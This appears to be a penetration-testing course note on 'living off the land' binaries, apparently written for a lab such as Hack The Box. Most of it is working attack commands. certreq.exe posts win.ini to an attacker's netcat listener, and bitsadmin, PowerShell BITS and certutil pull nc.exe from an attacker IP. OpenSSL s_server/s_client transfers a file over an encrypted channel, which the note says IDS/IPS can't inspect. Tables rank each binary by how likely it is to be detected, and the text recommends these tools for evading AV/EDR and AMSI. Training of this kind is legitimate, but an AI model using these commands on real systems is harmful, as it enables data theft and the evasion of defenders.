# 08 — Living off the Land (LOLBins)

## Overview

"Living off the Land" means using **binaries already installed on the target** to perform actions like file downloads, uploads, and command execution — no need to drop custom tools that might trigger AV/EDR.

| Resource | Platform | URL |
|----------|----------|-----|
| **LOLBAS Project** | Windows | https://lolbas-project.github.io |
| **GTFOBins** | Linux | https://gtfobins.github.io |

> **Key Insight:** These aren't exploits — they're legitimate system binaries being used for unintended purposes. Defenders can't just remove them because the OS needs them.

### LOLBins Can Perform:

- Download / Upload
- Command Execution
- File Read / File Write
- Security Bypasses

---

## Windows LOLBins

### CertReq.exe — File Upload

Normally used for certificate requests, but can POST file contents to an attacker's listener.

**Attack Host — Start Listener:**

```bash
sudo nc -lvnp 8000
```

**Target — Upload a File:**

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

> You'll see an error (`ERROR_WINHTTP_TIMEOUT`) on the target — that's expected. The file content still arrives in your Netcat session as the POST body.

**What You Receive:**

```
POST / HTTP/1.1
Content-Type: application/json
Content-Length: 92
...

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

> Copy-paste the content below the HTTP headers. The file is embedded in the POST request body.

---

### Bitsadmin — File Download

BITS (Background Intelligent Transfer Service) downloads files while being "polite" about bandwidth usage.

**Direct Bitsadmin:**

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**PowerShell BITS Module:**

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

> PowerShell BITS also supports credentials and proxy servers.

---

### Certutil — File Download (⚠️ Detected by AMSI)

The classic "wget for Windows." Works on **all Windows versions** but is now flagged by AMSI.

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

> ⚠️ AMSI currently detects this as malicious. Use as a last resort or when AV is disabled.

---

### Windows LOLBins Quick Reference

| Binary | Function | Detection Risk |
|--------|----------|----------------|
| `certreq.exe` | Upload (POST) | Low |
| `bitsadmin` | Download | Medium |
| `certutil.exe` | Download | **High** (AMSI flagged) |
| PowerShell BITS | Download | Medium |

> Search LOLBAS with `/download` or `/upload` to find more.

---

## Linux LOLBins (GTFOBins)

### OpenSSL — Encrypted File Transfer

OpenSSL can act as both a server and client for **encrypted** file transfers — like Netcat but with SSL/TLS.

**Step 1: Generate Self-Signed Certificate (Attack Host):**

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

> Hit Enter through all the prompts — the certificate details don't matter.

**Step 2: Serve a File (Attack Host):**

```bash
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

> This serves `LinEnum.sh` over an SSL connection on port 80.

**Step 3: Download on Target:**

```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

> The file transfers over an **encrypted** channel — IDS/IPS can't inspect the content.

---

### Linux LOLBins Quick Reference

| Binary | Function | Notes |
|--------|----------|-------|
| `openssl` | Upload/Download (encrypted) | Requires cert generation |
| `wget` | Download | Usually available, but obvious |
| `curl` | Upload/Download | Usually available, but obvious |
| `nc` | Upload/Download | Raw TCP, unencrypted |

> Search GTFOBins with `+file download` or `+file upload` to find more.

---

## The Big Picture: When to Use LOLBins

| Scenario | Approach |
|----------|----------|
| AV/EDR blocking your tools | Use LOLBins already on the system |
| Can't upload Netcat to target | Use `certreq.exe`, `bitsadmin`, or `openssl` instead |
| Need encrypted transfer on Linux | `openssl s_server` / `s_client` |
| Need to avoid network signatures | BITS blends with normal Windows traffic |
| Certutil getting caught | Switch to `certreq.exe` or BITS |

> 💡 The more obscure LOLBins you know, the more options you have when the common ones are blocked. Bookmark LOLBAS and GTFOBins and experiment with as many as possible.
